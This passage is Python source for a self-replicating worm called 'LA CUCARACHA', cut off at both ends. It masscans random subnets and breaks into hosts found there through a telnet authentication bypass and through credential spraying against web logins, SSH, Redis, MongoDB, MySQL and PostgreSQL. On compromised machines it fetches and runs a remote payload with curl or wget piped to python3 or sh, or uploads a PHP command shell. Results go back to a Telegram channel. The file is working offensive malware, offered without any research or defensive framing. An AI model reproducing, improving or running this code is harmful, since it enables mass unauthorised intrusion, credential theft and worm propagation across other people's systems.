                            uname = username_bytes.replace(b"\x00", b"").decode(errors="replace")
                            self.r.short("PWN", f"{ip}:{port}", f"CVE-2026 {uname}:", "telnetd bypass")
                            return {
                                "ip": ip, "port": port, "service": "telnet",
                                "username": uname, "password": "",
                                "status": "pwned", "vector": "cve-2026"
                            }
                sock.close()
            except Exception:
                continue
        return None

    def exploit(self, ip: str, port: int = 23) -> Optional[Dict]:
        result = self._cve_2026_bypass(ip, port)
        if result:
            return result

        check = self._check(ip, port)
        if not check or check.get("status") != "live":
            return check

        stored_creds = self.db.get_creds()
        for user, pwd in (stored_creds + TELNET_CREDS)[:25]:
            if self._stop:
                break
            self.r.short("ATTEMPT", f"{ip}:{port}/telnet", f"{user}:{pwd}")
            if self._login(ip, port, user, pwd):
                self.r.short("PWN", f"{ip}:{port}", f"TELNET {user}:{pwd}", "\u2705 SHELL ACCESS")
                return {
                    "ip": ip, "port": port, "service": "telnet",
                    "username": user, "password": pwd,
                    "status": "pwned", "vector": "cred_spray"
                }
            time.sleep(0.2)

        self.r.short("ATTEMPT", f"{ip}:{port}/telnet", "FAILED — no valid creds")
        return {"ip": ip, "port": port, "service": "telnet", "status": "no_creds"}


class WebExploitEngine:
    """Web exploitation with login forms, default creds, and data leaks."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self._stop = False
        self._ctx = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode = ssl.CERT_NONE

    def stop(self):
        self._stop = True

    def _probe(self, ip: str, port: int, path: str = "/") -> Optional[Dict]:
        proto = "https" if port in (443, 8443, 9443) else "http"
        url = f"{proto}://{ip}:{port}{path}"
        try:
            req = urllib.request.Request(url, method="GET",
                                          headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=4, context=self._ctx)
            body = resp.read(4096).decode(errors="ignore")
            status = resp.status
            resp.close()
            return {"status": status, "body": body, "url": url}
        except urllib.error.HTTPError as e:
            body = e.read(2048).decode(errors="ignore")
            return {"status": e.code, "body": body, "url": url}
        except Exception:
            return None

    def _login_post(self, ip: str, port: int, path: str, user: str, pwd: str) -> bool:
        proto = "https" if port in (443, 8443, 9443) else "http"
        url = f"{proto}://{ip}:{port}{path}"
        try:
            form_data = [
                {"username": user, "password": pwd},
                {"user": user, "pass": pwd},
                {"login": user, "password": pwd},
                {"email": user, "pass": pwd},
                {"uname": user, "pwd": pwd},
            ]
            for data in form_data:
                post_data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(
                    url, data=post_data,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0"},
                    method="POST"
                )
                resp = urllib.request.urlopen(req, timeout=3, context=self._ctx)
                body = resp.read(2048).decode(errors="ignore")
                resp.close()
                if body and ("incorrect" not in body.lower() and "invalid" not in body.lower() and "failed" not in body.lower() and "error" not in body.lower()):
                    if "logout" in body.lower() or "dashboard" in body.lower() or "welcome," in body.lower() or "welcome back" in body.lower():
                        return True
        except Exception:
            pass
        return False

    def exploit(self, ip: str, port: int) -> Optional[Dict]:
        probe = self._probe(ip, port)
        if not probe:
            return {"ip": ip, "port": port, "service": "web", "status": "unreachable"}

        body = probe.get("body", "").lower()
        status = probe.get("status", 0)

        leak_indicators = ["uid=", "root:", "admin:", "deviceid",
                           "firmware", "camera", "config", "password=",
                           "software version", "serial", "model"]
        if any(ind in body for ind in leak_indicators):
            self.r.short("WEB", f"{ip}:{port}", "DATA LEAK", "Config accessible")
            return {"ip": ip, "port": port, "service": "web", "status": "data_leak"}

        login_indicators = ["login", "password", "sign in", "authenticate",
                            "username", "admin panel", "dashboard", "log in",
                            "user", "sign-in", "auth"]
        is_login = any(ind in body for ind in login_indicators)

        if not is_login and status == 200:
            return {"ip": ip, "port": port, "service": "web", "status": "no_auth"}

        self.r.short("WEB", f"{ip}:{port}", "LOGIN PAGE", f"HTTP {status}")

        stored_creds = self.db.get_creds()
        login_paths = ["/login", "/admin", "/", "/user/login",
                       "/admin/login", "/cgi-bin/login", "/auth",
                       "/api/login", "/login_check", "/SignIn"]

        for user, pwd in (stored_creds + WEB_CREDS)[:25]:
            if self._stop:
                break
            for path in login_paths[:3]:
                self.r.short("ATTEMPT", f"{ip}:{port}/web", f"{user}:{pwd} @ {path}")
                if self._login_post(ip, port, path, user, pwd):
                    self.r.short("PWN", f"{ip}:{port}", f"WEB {user}:{pwd}", f"via {path}")
                    return {
                        "ip": ip, "port": port, "service": "web",
                        "username": user, "password": pwd,
                        "status": "pwned", "vector": "login_post",
                        "path": path
                    }
            time.sleep(0.2)

        self.r.short("ATTEMPT", f"{ip}:{port}/web", "FAILED — no valid creds")
        return {"ip": ip, "port": port, "service": "web", "status": "no_creds"}


class DBExploitEngine:
    """Database exploitation: Redis, MongoDB, MySQL, PostgreSQL, Elasticsearch."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self._stop = False

    def stop(self):
        self._stop = True

    def _redis(self, ip: str, port: int = 6379) -> Optional[Dict]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.send(b"PING\r\n")
            resp = s.recv(1024)
            if b"+PONG" not in resp:
                s.close()
                return None
            # First check unauth access
            s.send(b"INFO\r\n")
            time.sleep(0.3)
            info_resp = s.recv(4096)
            if b"redis_version" in info_resp or b"# Server" in info_resp:
                s.close()
                self.r.short("PWN", f"{ip}:6379", "REDIS UNAUTH", "No password required")
                return {"ip": ip, "port": port, "service": "redis",
                        "username": "redis", "password": "",
                        "status": "pwned", "vector": "unauth"}
            # Try AUTH with credential spray
            for user, pwd in DB_CREDS:
                if self._stop:
                    break
                if not pwd:
                    continue
                try:
                    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s2.settimeout(3)
                    s2.connect((ip, port))
                    s2.send(b"PING\r\n")
                    s2.recv(1024)
                    s2.send(f"AUTH {pwd}\r\n".encode())
                    time.sleep(0.3)
                    auth_resp = s2.recv(1024)
                    s2.close()
                    if b"+OK" in auth_resp:
                        self.r.short("PWN", f"{ip}:6379", f"REDIS auth:{pwd}", "DB access")
                        return {"ip": ip, "port": port, "service": "redis",
                                "username": pwd, "password": pwd,
                                "status": "pwned", "vector": "auth_spray"}
                except Exception:
                    continue
            s.close()
        except Exception:
            pass
        return None

    def _mongodb(self, ip: str, port: int = 27017) -> Optional[Dict]:
        try:
            import pymongo
            # Try unauth first
            try:
                client = pymongo.MongoClient(f"mongodb://{ip}:{port}/",
                                              serverSelectionTimeoutMS=3000)
                info = client.server_info()
                client.close()
                self.r.short("PWN", f"{ip}:27017", "MONGO UNAUTH", f"v{info.get('version','?')}")
                return {
                    "ip": ip, "port": port, "service": "mongodb",
                    "username": "mongodb", "password": "",
                    "version": info.get("version", "?"), "status": "pwned", "vector": "unauth"
                }
            except Exception:
                pass
            # Try credential spray
            for user, pwd in DB_CREDS:
                if self._stop:
                    break
                try:
                    uri = f"mongodb://{user}:{pwd}@{ip}:{port}/"
                    client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=3000)
                    info = client.server_info()
                    client.close()
                    self.r.short("PWN", f"{ip}:27017", f"MONGO {user}:{pwd}", "DB access")
                    return {
                        "ip": ip, "port": port, "service": "mongodb",
                        "username": user, "password": pwd,
                        "version": info.get("version", "?"), "status": "pwned", "vector": "cred_spray"
                    }
                except Exception:
                    continue
        except ImportError:
            pass
        except Exception:
            pass
        return None

    def _mysql(self, ip: str, port: int = 3306) -> Optional[Dict]:
        try:
            import mysql.connector
            for user, pwd in DB_CREDS:
                try:
                    self.r.short("ATTEMPT", f"{ip}:3306/mysql", f"{user}:{pwd}")
                    conn = mysql.connector.connect(
                        host=ip, port=port, user=user, password=pwd,
                        connection_timeout=3
                    )
                    conn.close()
                    self.r.short("PWN", f"{ip}:3306", f"MYSQL {user}:{pwd}", "DB access")
                    return {
                        "ip": ip, "port": port, "service": "mysql",
                        "username": user, "password": pwd, "status": "pwned"
                    }
                except Exception:
                    continue
        except ImportError:
            pass
        except Exception:
            pass
        return None

    def _postgres(self, ip: str, port: int = 5432) -> Optional[Dict]:
        try:
            import psycopg2
            for user, pwd in DB_CREDS:
                try:
                    self.r.short("ATTEMPT", f"{ip}:5432/postgres", f"{user}:{pwd}")
                    conn = psycopg2.connect(
                        host=ip, port=port, user=user, password=pwd,
                        connect_timeout=3
                    )
                    conn.close()
                    self.r.short("PWN", f"{ip}:5432", f"POSTGRES {user}:{pwd}", "DB access")
                    return {
                        "ip": ip, "port": port, "service": "postgresql",
                        "username": user, "password": pwd, "status": "pwned"
                    }
                except Exception:
                    continue
        except ImportError:
            pass
        except Exception:
            pass
        return None

    def _elasticsearch(self, ip: str, port: int = 9200) -> Optional[Dict]:
        try:
            import requests as _
            resp = _.get(f"http://{ip}:{port}/", timeout=3, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                version = data.get("version", {}).get("number", "?")
                self.r.short("PWN", f"{ip}:9200", f"ELASTIC {version}", "Unauth access")
                return {
                    "ip": ip, "port": port, "service": "elasticsearch",
                    "version": version, "status": "unauth"
                }
        except ImportError:
            pass
        except Exception:
            pass
        return None

    def exploit(self, ip: str, port: int) -> Optional[Dict]:
        if port == 6379:
            return self._redis(ip, port)
        elif port == 27017:
            return self._mongodb(ip, port)
        elif port == 3306:
            return self._mysql(ip, port)
        elif port == 5432:
            return self._postgres(ip, port)
        elif port in (9200, 9300):
            return self._elasticsearch(ip, port)
        return None


class SSHEngine:
    """SSH brute force with credential spray."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self._stop = False
        try:
            import logging as _lg
            _lg.getLogger("paramiko").setLevel(_lg.WARNING)
        except Exception:
            pass

    def stop(self):
        self._stop = True

    def _check_ssh(self, ip: str, port: int = 22) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            banner = s.recv(1024)
            s.close()
            return b"SSH" in banner
        except Exception:
            return False

    def exploit(self, ip: str, port: int = 22) -> Optional[Dict]:
        try:
            import paramiko
        except ImportError:
            return {"ip": ip, "port": port, "service": "ssh", "status": "no_lib"}

        if not self._check_ssh(ip, port):
            return {"ip": ip, "port": port, "service": "ssh", "status": "not_ssh"}

        stored_creds = self.db.get_creds()
        all_creds = stored_creds + SSH_CREDS

        for user, pwd in all_creds[:25]:
            if self._stop:
                break
            self.r.short("ATTEMPT", f"{ip}:{port}/ssh", f"{user}:{pwd}")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=pwd,
                               timeout=3, banner_timeout=3, auth_timeout=3,
                               allow_agent=False, look_for_keys=False, gss_auth=False, gss_kex=False)
                client.close()
                self.r.short("PWN", f"{ip}:{port}", f"SSH {user}:{pwd}", "\u2705 SHELL ACCESS")
                return {
                    "ip": ip, "port": port, "service": "ssh",
                    "username": user, "password": pwd, "status": "pwned"
                }
            except (paramiko.AuthenticationException, paramiko.SSHException):
                continue
            except Exception:
                continue

        return {"ip": ip, "port": port, "service": "ssh", "status": "no_creds"}


# ═════════════════════════════════════════════════════════════════════
# WORM DEPLOYMENT ENGINE
# ═════════════════════════════════════════════════════════════════════

class WormDeployEngine:
    """Deploy LaCucaracha worm to pwned targets via multiple vectors."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self._stop = False
        self._payload_url = PAYLOAD_URL
        self._deploy_pool = concurrent.futures.ThreadPoolExecutor(max_workers=5)

    def stop(self):
        self._stop = True

    def deploy_via_ssh(self, ip: str, user: str, pwd: str, port: int = 22) -> bool:
        self.r.short("DEPLOY", f"{ip}:{port}", "SSH starting", "curl la_cucaracha.py")
        result = [False]
        def _worker():
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=pwd,
                               timeout=10, allow_agent=False, look_for_keys=False)
                token = base64.b64encode(os.urandom(16)).decode()[:16]
                cmd = f"curl -s {self._payload_url}?token={token} -o /tmp/w.py && python3 /tmp/w.py --auto --replicate --aggressive &"
                client.exec_command(cmd, timeout=30)
                client.close()
                result[0] = True
            except Exception:
                pass
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        t.join(timeout=30)
        return result[0]

    def deploy_via_wget(self, ip: str, user: str, pwd: str, port: int = 22) -> bool:
        self.r.short("DEPLOY", f"{ip}:{port}", "WGET starting", "wget la_cucaracha.py")
        result = [False]
        def _worker():
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=pwd,
                               timeout=10, allow_agent=False, look_for_keys=False)
                token = base64.b64encode(os.urandom(16)).decode()[:16]
                cmd = f"wget -qO- {self._payload_url}?token={token} | python3 &"
                client.exec_command(cmd, timeout=30)
                client.close()
                result[0] = True
            except Exception:
                pass
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        t.join(timeout=30)
        return result[0]

    def deploy_via_telnet(self, ip: str, user: str, pwd: str, port: int = 23) -> bool:
        self.r.short("DEPLOY", f"{ip}:{port}", "TELNET starting", "wget | sh")
        result = [False]
        def _worker():
            try:
                import paramiko
                if self.deploy_via_ssh(ip, user, pwd):
                    result[0] = True
                    return
            except Exception:
                pass
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, port))
                s.recv(1024)
                s.send(f"{user}\n".encode())
                time.sleep(0.3)
                s.recv(1024)
                s.send(f"{pwd}\n".encode())
                time.sleep(0.5)
                token = base64.b64encode(os.urandom(16)).decode()[:16]
                s.send(f"wget -qO- {self._payload_url}?token={token} | sh &\n".encode())
                time.sleep(2)
                s.close()
                result[0] = True
            except Exception:
                pass
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        t.join(timeout=30)
        return result[0]

    def deploy_via_web(self, ip: str, port: int, user: str = "", pwd: str = "") -> bool:
        self.r.short("DEPLOY", f"{ip}:{port}", "WEB starting", "upload PHP shell")
        result = [False]
        def _worker():
            nonlocal user, pwd
            if not user:
                user = "admin"
            if not pwd:
                pwd = "admin"
            proto = "https" if port in (443, 8443, 9443) else "http"
            base = f"{proto}://{ip}:{port}"
            shell_payload = "<?php system($_GET['cmd']); ?>"
            upload_paths = [
                "/upload.php", "/admin/upload.php", "/cgi-bin/upload.cgi",
                "/wp-content/plugins/", "/api/v1/upload", "/files/upload",
            ]
            token = base64.b64encode(os.urandom(16)).decode()[:16]
            worm_cmd = f"curl -s {self._payload_url}?token={token} | python3 &"
            for path in upload_paths:
                try:
                    import requests
                    url = f"{base}{path}"
                    files = {"file": ("shell.php", shell_payload, "application/x-php")}
                    resp = requests.post(url, files=files, timeout=5, verify=False)
                    if resp.status_code in (200, 201, 302):
                        shell_url = f"{base}/shell.php"
                        requests.get(f"{shell_url}?cmd={urllib.parse.quote(worm_cmd)}",
                                     timeout=5, verify=False)
                        self.r.short("DEPLOY", f"{ip}:{port}", "WEB SHELL", f"uploaded via {path}")
                        result[0] = True
                        return
                except Exception:
                    continue
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        t.join(timeout=30)
        return result[0]

    def deploy_all(self, targets: List[Dict], max_workers: int = 5) -> int:
        if not targets:
            return 0
        deployed = 0
        lock = threading.Lock()
        self.r.short("DEPLOY", f"{len(targets)} targets", "START", "Multi-vector deployment")

        def _deploy_one(target):
            nonlocal deployed
            ip = target.get("ip", "")
            user = target.get("username", "root")
            pwd = target.get("password", "root")
            port = target.get("port", 22)
            service = target.get("service", "ssh")
            if self._stop:
                return False
            if self.deploy_via_ssh(ip, user, pwd):
                self.r.short("DEPLOY", f"{ip}", "SSH", "\u2705 SUCCESS")
                with lock:
                    deployed += 1
                return True
            if self.deploy_via_wget(ip, user, pwd):
                self.r.short("DEPLOY", f"{ip}", "WGET", "\u2705 SUCCESS")
                with lock:
                    deployed += 1
                return True
            if service == "telnet" or port == 23:
                if self.deploy_via_telnet(ip, user, pwd):
                    self.r.short("DEPLOY", f"{ip}", "TELNET", "\u2705 SUCCESS")
                    with lock:
                        deployed += 1
                    return True
            if port in (80, 443, 8080, 8443, 8888):
                if self.deploy_via_web(ip, port, user, pwd):
                    self.r.short("DEPLOY", f"{ip}:{port}", "WEB", "\u2705 SUCCESS")
                    with lock:
                        deployed += 1
                    return True
            self.r.short("DEPLOY", f"{ip}", "\u274c FAILED", "all vectors exhausted")
            return False

        pool = self._deploy_pool  # persistent — reuse across epochs
        futures = {pool.submit(_deploy_one, t): t for t in targets}
        done = 0
        for f in concurrent.futures.as_completed(futures, timeout=60):
            done += 1
            try:
                f.result(timeout=1)
            except Exception:
                pass
        for f in futures:
            f.cancel()

        self.r.short("DEPLOY", f"{deployed} deployed", "COMPLETE", f"{len(targets)} targets")
        return deployed


# ═════════════════════════════════════════════════════════════════════
# SMART ORCHESTRATOR — Full IF/THEN Loop
# ═════════════════════════════════════════════════════════════════════

class SmartOrchestrator:
    """Master orchestrator with IF/THEN decision engine and full Telegram reporting."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self.epoch = 0
        self._start_time = time.time()
        self._stop = False
        self._phase = "DISCOVER"
        self._phase_start = time.time()
        self._min_phase = 0.5

        # Persistent thread pools — reuse across epochs to prevent thread leak
        self._exploit_pool = concurrent.futures.ThreadPoolExecutor(max_workers=30)
        self._scan_pool = concurrent.futures.ThreadPoolExecutor(max_workers=5)

        # Engines
        self.telnet = TelnetExploitEngine(reporter, db)
        self.web = WebExploitEngine(reporter, db)
        self.db_exploit = DBExploitEngine(reporter, db)
        self.ssh = SSHEngine(reporter, db)
        self.deployer = WormDeployEngine(reporter, db)

        # Decision engine
        self.decision = DecisionEngine(reporter, db)

        # Stats
        self.stats = {
            "epochs": 0, "scanned": 0, "exploited": 0, "deployed": 0,
            "telnet_pwned": 0, "web_pwned": 0, "db_pwned": 0, "ssh_pwned": 0,
        }
        self._current_targets: List[Dict] = []
        self._pwned_this_epoch: List[Dict] = []

    def stop(self):
        self._stop = True
        self._exploit_pool.shutdown(wait=False)
        self._scan_pool.shutdown(wait=False)

    def _check_masscan(self) -> bool:
        try:
            r = subprocess.run(["which", "masscan"], capture_output=True, text=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False

    # ─── PHASE: DISCOVER ───────────────────────────────────────────

    def _discover(self) -> List[Dict]:
        self._phase_start = time.time()
        self.r.short("DISCOVER", "Subnet sweep", "START", "Scanning 5 subnets parallel")

        if not self._check_masscan():
            self.r.short("DISCOVER", "Scanner", "FAIL", "masscan not available")
            return []
        # Pick 3 random subnets for parallel scan
        subnets = random.sample(SPIDER_SUBNETS, min(3, len(SPIDER_SUBNETS)))
        self.r.short("SCAN", f"{len(subnets)} subnets", "MASSING", f"ports={len(SERVICE_PRIORITY)}")

        all_fresh: List[Dict] = []
        lock = threading.Lock()

        def _scan(subnet):
            out_file = f"/tmp/ms_{hash(subnet) % 100000}.json"
            cmd = ["masscan", subnet, "-p", MASSCAN_PORTS,
                   "--rate", str(MASSCAN_RATE), "--wait", str(MASSCAN_WAIT),
                   "-oJ", out_file, "--open-only"]
            try:
                subprocess.run(cmd, capture_output=True, timeout=45)
            except subprocess.TimeoutExpired:
                pass
            except Exception:
                return []
            local = []
            try:
                with open(out_file) as f:
                    for line in f:
                        line = line.strip().rstrip(",")
                        if not line or line in ("[", "]"):
                            continue
                        try:
                            entry = json.loads(line)
                        except json.JSONDecodeError:
                            continue
                        ip = entry.get("ip", "")
                        pl = entry.get("ports", [])
                        if not ip or not pl:
                            continue
                        for pe in pl:
                            port = pe.get("port", 0)
                            proto = pe.get("proto", "tcp")
                            if not port:
                                continue
                            now = datetime.now(timezone.utc).isoformat()
                            self.db.add_target(ip, port, proto)
                            local.append({"ip": ip, "port": port, "protocol": proto})
            except FileNotFoundError:
                pass
            except Exception:
                pass
            try:
                os.remove(out_file)
            except Exception:
                pass
            if local:
                self.r.short("SCAN", subnet, "FOUND", f"{len(local)} hosts")
            return local

        scan_pool = self._scan_pool  # persistent
        results = list(scan_pool.map(_scan, subnets))

        for r in results:
            all_fresh.extend(r)

        if all_fresh:
            self.r.short("DISCOVER", f"{len(all_fresh)} hosts", "FOUND", f"across {len(subnets)} subnets")
            for t in all_fresh[:3]:
                e = SERVICE_EMOJI.get(t["port"], "\U0001f50c")
                self.r.short("ALIVE", f"{t['ip']}:{t['port']}", f"{e} OPEN")

            # SCAN-COMPLETE BOX REPORT
            port_counts = {}
            for t in all_fresh:
                port_counts[t["port"]] = port_counts.get(t["port"], 0) + 1
            top_ports = sorted(port_counts.items(), key=lambda x: -x[1])[:5]
            default_emoji = "\U0001f50c"
            port_lines = [f"\u2551 {SERVICE_EMOJI.get(p, default_emoji)} {SERVICE_NAME.get(p, 'Port ' + str(p))}: {c} hosts" for p, c in top_ports]
            b = "\u2550"
            scan_report = [
                f"\u2554{b*22}\u2557",
                f"\u2551 \U0001f50d SCAN COMPLETE — Epoch {self.epoch:03d}",
                f"\u2551 {len(all_fresh)} fresh targets across {len(subnets)} subnets",
                *port_lines,
                f"\u2551 \u23f0 Scan time: {int(time.time() - self._phase_start)}s",
                f"\u255a{b*22}\u255d",
            ]
            self.r.msg(f"\U0001f4ca DISCOVER COMPLETE — {len(all_fresh)} NEW TARGETS", scan_report)
            self.stats["scanned"] += len(all_fresh)
        else:
            self.r.short("SCAN", "all subnets", "EMPTY", "No responsive hosts")

        return all_fresh

    # ─── PHASE: SCORE ──────────────────────────────────────────────

    def _score(self, targets: List[Dict]) -> List[Dict]:
        if not targets:
            return []

        scored = sorted(
            targets,
            key=lambda t: -SERVICE_PRIORITY.get(int(t.get("port", 0)), 1)
        )

        top_ports = defaultdict(int)
        for t in scored[:150]:
            top_ports[int(t.get("port", 0))] += 1

        lines = []
        for port, count in sorted(top_ports.items(), key=lambda x: -x[1])[:8]:
            svc = SERVICE_NAME.get(port, f"P{port}")
            emoji = SERVICE_EMOJI.get(port, "\U0001f50c")
            lines.append(f"\u2551 {emoji} {svc:>12} : {count:>5}")

        lines.append(BOX_SEP)
        total = len(scored)
        telnet = top_ports.get(23, 0)
        web = sum(top_ports.get(p, 0) for p in [80, 443, 8080, 8443, 3000, 5000, 7000, 8888])
        db = sum(top_ports.get(p, 0) for p in [3306, 5432, 27017, 6379])
        ssh = top_ports.get(22, 0)
        lines.append(f"\u2551 \U0001f4ca Totals: {total} scored | Telnet:{telnet} Web:{web} DB:{db} SSH:{ssh}")

        self.r.msg(f"\U0001f3af EPOCH {self.epoch:03d} \u2014 TARGET SCORING", lines)

        return scored  # NO CAP — full aggression

    # ─── PHASE: EXPLOIT ────────────────────────────────────────────

    def _exploit_single_inner(self, target: Dict) -> Optional[Dict]:
        ip = target.get("ip", "")
        port = int(target.get("port", 0))
        if not ip or not port:
            return None

        try:
            if port == 23:
                return self.telnet.exploit(ip, port)
            elif port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9092, 9200, 9443, 9999, 7547):
                return self.web.exploit(ip, port)
            elif port in (3306, 5432, 27017, 6379, 9200, 9300):
                return self.db_exploit.exploit(ip, port)
            elif port in (22, 2222):
                return self.ssh.exploit(ip, port)
            else:
                return self.web.exploit(ip, port)
        except Exception as e:
            self.r.short("ERROR", f"{ip}:{port}", str(e)[:80])
            log.debug(f"Exploit err {ip}:{port}: {e}")
            return None

    # ─── PHASE: EXPLOIT PHASE ────────────────────────────────────────

    def _exploit_single(self, target: Dict) -> Optional[Dict]:
        """Wrap exploit in a thread with hard 30s timeout."""
        result = [None]
        t = threading.Thread(
            target=lambda: result.__setitem__(0, self._exploit_single_inner(target)),
            daemon=True,
        )
        t.start()
        t.join(timeout=30)
        return result[0]

    def _exploit_phase(self, targets: List[Dict]) -> int:
        if not targets:
            return 0

        total = len(targets)
        self.r.short("EXPLOIT", f"{total} targets", "START", "30 workers | 120s timeout")
        log.info(f"EXPLOIT phase: {total} targets, 30 workers")

        pwned = 0
        done = 0
        self._pwned_this_epoch = []
        last_logged_done = 0

        pool = self._exploit_pool  # persistent — reuse across epochs
        futures = {pool.submit(self._exploit_single, t): t for t in targets}

        # Threading watchdog — hard interrupt after 120s
        self._exploit_timeout = False
        def _timeout_kick():
            self._exploit_timeout = True
            # Also set a flag on each unfinished future
            for f in futures:
                if not f.done():
                    try:
                        # Force-interrupt by cancel doesn't work for running threads,
                        # but at least we stop checking them
                        pass
                    except Exception:
                        pass
        watchdog = threading.Timer(120, _timeout_kick)
        watchdog.daemon = True
        watchdog.start()

        try:
            while futures and not self._exploit_timeout:
                for f in list(futures.keys()):
                    if not f.done():
                        continue
                    futures.pop(f)
                    done += 1
                    try:
                        result = f.result(timeout=1)
                    except TimeoutError:
                        raise  # let SIGALRM propagate
                    except Exception:
                        continue

                    if result is None:
                        continue

                    ip = result.get("ip", "")
                    port = result.get("port", 0)

                    if result.get("status") == "pwned" or result.get("username"):
                        pwned += 1
                        self.db.mark_exploited(
                            ip, port,
                            result.get("username", ""),
                            result.get("password", ""),
                        )
                        self._pwned_this_epoch.append(result)
                        svc = result.get("service", "?")
                        creds = f"{result.get('username','')}:{result.get('password','')}"
                        vector = result.get("vector", result.get("service", "unknown"))
                        self.r.short("PWN", f"{ip}:{port}", f"{svc} {creds}", f"via {vector}")
                        log.info(f"\U0001f525 PWNED {ip}:{port} via {svc} [{creds}]")

                        if svc == "telnet":
                            self.stats["telnet_pwned"] += 1
                        elif svc in ("web", "http", "https"):
                            self.stats["web_pwned"] += 1
                        elif svc in ("redis", "mongodb", "mysql", "postgresql", "elasticsearch"):
                            self.stats["db_pwned"] += 1
                        elif svc == "ssh":
                            self.stats["ssh_pwned"] += 1

                    elif result.get("status") == "live":
                        svc = result.get("service", "")
                        if svc == "telnet":
                            self.stats["telnet_live"] = self.stats.get("telnet_live", 0) + 1
                        elif svc == "web":
                            self.stats["web_live"] = self.stats.get("web_live", 0) + 1

                if done != last_logged_done:
                    last_logged_done = done
                    elapsed = time.time() - self._phase_start
                    rate = done / elapsed if elapsed > 0 else 0
                    log.info(f"EXPLOIT: {done}/{total} ({pwned} pwned, {rate:.1f}/s)")

                if futures:
                    time.sleep(0.3)

        except (TimeoutError, Exception):
            watchdog.cancel()
            self.r.short("EXPLOIT", "Phase", "TIMEOUT",
                         f"{len(futures)} targets cut — next epoch")
            log.info(f"EXPLOIT timeout: {done}/{total} done, {len(futures)} cut")

        finally:
            watchdog.cancel()
            for f in futures:
                f.cancel()

        self.stats["exploited"] += pwned
        log.info(f"EXPLOIT done: {done}/{total}, {pwned} pwned")
        return pwned

    # ─── PHASE: DEPLOY ─────────────────────────────────────────────

    def _deploy_phase(self, pwned_targets: List[Dict]) -> int:
        if not pwned_targets:
            return 0
        deployed = self.deployer.deploy_all(pwned_targets)
        self.stats["deployed"] += deployed
        return deployed

    # ─── PHASE: REPORT ─────────────────────────────────────────────

    def _report(self, pwned_count: int, deployed_count: int = 0) -> None:
        db_stats = self.db.stats()
        ports = self.db.port_breakdown()

        uptime = int(time.time() - self._start_time)
        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m" if uptime > 3600 else f"{uptime//60}m"

        lines = [
            f"\u2551 \U0001f4ca DB STATE",
            f"\u2551 \U0001f3af Targets:     {db_stats.get('targets',0):>8}",
            f"\u2551 \U0001f3c6 Exploited:   {db_stats.get('exploited',0):>8}",
            f"\u2551 \U0001f511 Credentials: {db_stats.get('credentials',0):>8}",
            f"\u2551 \U0001f4e6 Deployed:    {self.stats.get('deployed',0):>8}",
            BOX_SEP,
            f"\u2551 \u23f1\ufe0f Uptime:      {uptime_str:>10}",
            f"\u2551 \U0001f50d Epochs run:  {self.epoch:>5}",
            f"\u2551 \U0001f4e1 Scanned:     {self.stats.get('scanned',0):>5}",
            f"\u2551 \U0001f4a5 Exploited:   {self.stats.get('exploited',0):>5}",
            f"\u2551 \U0001f3c6 This epoch:  {pwned_count:>5}",
        ]

        pwn_lines = []
        if self.stats["telnet_pwned"]:
            pwn_lines.append(f"\u2551 \U0001f510 Telnet: {self.stats['telnet_pwned']}")
        if self.stats["web_pwned"]:
            pwn_lines.append(f"\u2551 \U0001f310 Web:    {self.stats['web_pwned']}")
        if self.stats["db_pwned"]:
            pwn_lines.append(f"\u2551 \U0001f5c4 DB:     {self.stats['db_pwned']}")
        if self.stats["ssh_pwned"]:
            pwn_lines.append(f"\u2551 \U0001f511 SSH:    {self.stats['ssh_pwned']}")
        if pwn_lines:
            lines.append(BOX_SEP)
            lines.append(f"\u2551 \U0001f525 PWNS BY SERVICE")
            lines += pwn_lines

        if deployed_count:
            lines.append(f"\u2551 \U0001f4e6 Deployed:  {deployed_count}")

        if ports:
            lines.append(BOX_SEP)
            lines.append(f"\u2551 \U0001f4e1 TOP PORTS")
            for p in ports[:6]:
                port_num = p["port"]
                count = p["c"]
                emoji = SERVICE_EMOJI.get(port_num, "\U0001f50c")
                name = SERVICE_NAME.get(port_num, f"P{port_num}")
                lines.append(f"\u2551 {emoji} {name:>12} : {count:>5}")

        lines.append(BOX_SEP)
        lines.append(f"\u2551 \U0001f9e0 Last Decision: {self.decision.get_decision_summary()}")

        self.r.msg(f"\U0001f4ca EPOCH {self.epoch:03d} \u2014 OPERATIONAL REPORT", lines)

    # ─── MAIN LOOP ─────────────────────────────────────────────────

    def run(self, max_epochs: int = 200) -> Dict:
        log.info(f"\U0001f41b LA CUCARACHA v{VERSION} starting")
        db_stats = self.db.stats()
        self.r.msg(
            f"\U0001f680 LA CUCARACHA v{VERSION} ONLINE",
